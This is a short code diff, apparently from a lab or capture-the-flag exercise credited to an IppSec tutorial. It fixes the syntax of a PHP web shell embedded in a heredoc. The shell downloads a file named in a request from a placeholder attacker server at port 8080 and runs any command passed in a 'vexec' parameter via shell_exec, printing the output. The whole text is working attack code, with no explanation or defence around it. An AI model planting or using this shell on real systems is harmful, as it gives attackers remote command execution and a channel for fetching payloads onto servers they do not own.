@@ -4,11 +4,11 @@
 #Taken from IppSec Bastard Tutorial
 $somevar = <<<'EOL'
 <?php
-  if(isset($_REQUEST['vupload'])) {
+  if (isset($_REQUEST['vupload'])) {
   file_put_contents($_REQUEST['vupload'], file_get_contents("http://MY.SER.VER.IP:8080/" . $_REQUEST['vupload']));
  };
- if(isset($_REQUEST['vexec'])) {
-  echo <pre> . shell_exec($_REQUEST['vexec']) . </pre>;
+ if (isset($_REQUEST['vexec'])) {
+  echo "<pre>" . shell_exec($_REQUEST['vexec']) . "</pre>";
  };
 ?>
 EOL;
